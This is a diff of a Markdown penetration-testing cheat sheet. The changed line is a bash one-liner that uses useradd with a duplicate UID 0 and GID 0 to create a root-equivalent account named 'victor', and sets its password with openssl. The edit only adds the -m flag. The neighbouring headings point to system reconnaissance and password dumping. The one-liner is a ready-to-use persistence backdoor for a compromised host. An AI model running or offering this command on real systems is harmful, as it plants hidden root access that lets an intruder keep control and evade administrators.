@@ -50,7 +50,7 @@ uname -a # print kernel version and system architecture
 
 ## One-liner: useradd and chpasswd
 ```bash
-useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor
+useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 -m victor
 ```
 
 ## Dump Passwords
